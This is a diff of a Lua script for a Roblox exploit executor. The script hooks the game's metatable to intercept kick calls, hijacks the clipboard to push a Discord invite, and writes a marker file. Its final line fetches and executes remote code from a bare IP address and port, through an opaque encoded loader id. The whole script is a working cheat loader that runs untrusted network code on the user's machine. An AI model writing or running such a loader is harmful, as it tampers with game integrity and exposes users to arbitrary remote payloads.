@@ -1,29 +1,26 @@
 local real_setclipboard = setclipboard
-
-setclipboard = function(...) end
+setclipboard = function() end
 
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
 local mt = getrawmetatable(game)
 setreadonly(mt, false)
-
 local old_namecall = mt.__namecall
 
 mt.__namecall = newcclosure(function(self, ...)
     local method = getnamecallmethod()
-
     if self == LocalPlayer and method == "Kick" then
-        setclipboard = real_setclipboard
         pcall(function()
+            writefile("DELTA_DUMP.txt", "https://discord.gg/KuNaFZUbBs")
+        end)
+        pcall(function()
+            setclipboard = real_setclipboard
             setclipboard("https://discord.gg/KuNaFZUbBs")
         end)
         return old_namecall(self, ...)
     end
-
     return old_namecall(self, ...)
 end)
 
-loadstring(game:HttpGet(
-    "http://109.71.240.235:3910/api/run/eyJpZCI6ImMxNmMyOTc4LTFhZDAtNDY1Yy04MGVkLTVkMDEzZjdhN2ZhOSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"
-))()
+loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6ImMxNmMyOTc4LTFhZDAtNDY1Yy04MGVkLTVkMDEzZjdhN2ZhOSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
